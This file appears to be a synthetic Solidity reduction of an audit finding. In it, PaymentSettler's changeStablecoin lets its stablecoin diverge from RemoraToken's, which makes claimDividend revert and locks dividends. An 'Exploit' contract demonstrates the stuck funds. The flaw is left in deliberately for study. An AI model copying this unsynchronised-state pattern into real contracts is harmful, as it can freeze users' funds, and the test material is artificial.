// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Remora Pledge — PaymentSettler.stablecoin can move and RemoraToken.stablecoin cannot (Cyfrin, finding 61177)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: changeStablecoin writes PaymentSettler.stablecoin, and the old DividendManager
    changeStablecoin on RemoraToken was removed. claimDividend then sees two different coins and
    reverts, so the dividend balance stays in the settler. Blamed assignment preserved (@> VULN). */

contract Stablecoin {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PaymentSettler {
    address public stablecoin;
    error InvalidAddress();

    constructor(address _stablecoin) {
        stablecoin = _stablecoin;
    }

    function changeStablecoin(address newStablecoin) external {
        if (newStablecoin == address(0)) revert InvalidAddress(); // @> VULN: this setter stores newStablecoin and RemoraToken has no matching write
        stablecoin = newStablecoin;
        // FIX: remove stablecoin from RemoraToken and settle fees only through PaymentSettler
    }

    function pay(address to, uint256 amount) external {
        Stablecoin(stablecoin).transfer(to, amount);
    }
}

contract RemoraToken {
    address public stablecoin; // make sure same stablecoin is used here that is used in payment settler
    PaymentSettler public settler;
    mapping(address => uint256) public dividendOwed;

    constructor(address _stablecoin, PaymentSettler _settler) {
        stablecoin = _stablecoin;
        settler = _settler;
    }

    function setDividend(address user, uint256 amount) external {
        dividendOwed[user] = amount;
    }

    function claimDividend(address user) external {
        address tokenCoin = stablecoin;
        address settlerCoin = settler.stablecoin();
        if (tokenCoin != settlerCoin) revert("stablecoin mismatch");
        uint256 amount = dividendOwed[user];
        dividendOwed[user] = 0;
        settler.pay(user, amount);
    }
}

contract Exploit {
    Stablecoin public oldCoin; // CREATE nonce 1
    Stablecoin public newCoin; // CREATE nonce 2
    PaymentSettler public settler; // CREATE nonce 3
    RemoraToken public token; // CREATE nonce 4
    bool public claimReverted;

    constructor() {
        oldCoin = new Stablecoin();
        newCoin = new Stablecoin();
        settler = new PaymentSettler(address(oldCoin));
        token = new RemoraToken(address(oldCoin), settler);
    }

    function run() external {
        oldCoin.mint(address(settler), 1000);
        token.setDividend(address(this), 1000);
        settler.changeStablecoin(address(newCoin));
        try token.claimDividend(address(this)) {
            claimReverted = false;
        } catch {
            claimReverted = true;
        }
        require(claimReverted, "claim should revert");
        require(token.stablecoin() == address(oldCoin), "token coin stuck");
        require(settler.stablecoin() == address(newCoin), "settler coin moved");
        require(oldCoin.balanceOf(address(settler)) == 1000, "1000 dividends locked");
        require(oldCoin.balanceOf(address(this)) == 0, "user received nothing");
    }

    /// @dev Control entry. Not called from run().
    function claimBeforeChange() external {
        token.claimDividend(address(this));
    }
}
